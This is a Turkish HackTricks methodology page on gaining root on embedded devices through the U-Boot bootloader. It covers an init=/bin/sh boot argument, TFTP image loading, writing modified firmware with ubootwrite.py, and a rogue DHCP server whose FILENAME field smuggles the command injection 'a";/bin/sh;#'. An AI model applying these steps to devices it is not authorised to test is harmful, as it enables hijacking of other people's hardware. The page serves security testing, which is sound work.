<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

Aşağıdaki adımlar, cihaz başlangıç yapılandırmalarını ve U-boot gibi önyükleyicileri değiştirmek için önerilir:

1. **Önyükleyici'nin Yorumlayıcı Kabuğuna Erişin**:
- Önyükleme sırasında, önyükleyici'nin yorumlayıcı kabuğuna erişmek için "0", boşluk veya diğer belirlenmiş "sihirli kodları" basın.

2. **Önyükleme Argümanlarını Değiştirin**:
- Aşağıdaki komutları çalıştırarak, önyükleme argümanlarına '`init=/bin/sh`' ekleyin ve bir kabuk komutunun yürütülmesine izin verin:
%%%
#printenv
#setenv bootargs=console=ttyS0,115200 mem=63M root=/dev/mtdblock3 mtdparts=sflash:<partitiionInfo> rootfstype=<fstype> hasEeprom=0 5srst=0 init=/bin/sh
#saveenv
#boot
%%%

3. **TFTP Sunucusunu Ayarlayın**:
- Yerel bir ağ üzerinden görüntüleri yüklemek için bir TFTP sunucusu yapılandırın:
%%%
#setenv ipaddr 192.168.2.2 #cihazın yerel IP'si
#setenv serverip 192.168.2.1 #TFTP sunucusu IP'si
#saveenv
#reset
#ping 192.168.2.1 #ağ erişimini kontrol edin
#tftp ${loadaddr} uImage-3.6.35 #loadaddr, dosyanın yükleneceği adresi ve TFTP sunucusundaki görüntünün dosya adını alır
%%%

4. **`ubootwrite.py`'yi Kullanın**:
- Kök erişimi elde etmek için U-boot görüntüsünü yazmak ve değiştirilmiş bir yazılım yüklemek için `ubootwrite.py`'yi kullanın.

5. **Hata Ayıklama Özelliklerini Kontrol Edin**:
- Ayrıntılı günlükleme, keyfi çekirdek yükleme veya güvenilmeyen kaynaklardan önyükleme gibi hata ayıklama özelliklerinin etkin olup olmadığını doğrulayın.

6. **Dikkatli Donanım Müdahalesi**:
- Cihazın önyükleme sırasında, özellikle çekirdek sıkıştırılmadan önce, bir pini toprağa bağlamak ve SPI veya NAND flash yongalarıyla etkileşime geçmek konusunda dikkatli olun. Pinleri kısaltmadan önce NAND flash yongasının veri sayfasına bakın.

7. **Sahte DHCP Sunucusunu Yapılandırın**:
- Bir cihazın PXE önyükleme sırasında alması için kötü niyetli parametrelerle sahte bir DHCP sunucusu kurun. Metasploit'in (MSF) DHCP yardımcı sunucusu gibi araçları kullanın. 'FILENAME' parametresini `'a";/bin/sh;#'` gibi komut enjeksiyon komutlarıyla değiştirerek cihaz başlatma prosedürleri için giriş doğrulamasını test edin.

**Not**: Cihaz pimleriyle fiziksel etkileşimi içeren adımlar (*yıldızla işaretlenmiş) cihazın zarar görmesini önlemek için son derece dikkatli bir şekilde ele alınmalıdır.


## Referanslar
* [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)


<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>
